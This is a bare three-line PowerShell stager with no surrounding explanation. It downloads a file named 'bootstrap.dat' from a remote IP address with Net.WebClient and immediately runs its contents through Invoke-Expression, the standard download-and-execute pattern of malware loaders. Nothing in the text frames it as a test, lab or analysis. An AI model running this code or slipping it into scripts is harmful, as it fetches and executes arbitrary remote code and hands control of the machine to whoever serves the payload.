$u = 'http://198.51.100.77/assets/bootstrap.dat'
$stage = (New-Object Net.WebClient).DownloadString($u)
Invoke-Expression $stage
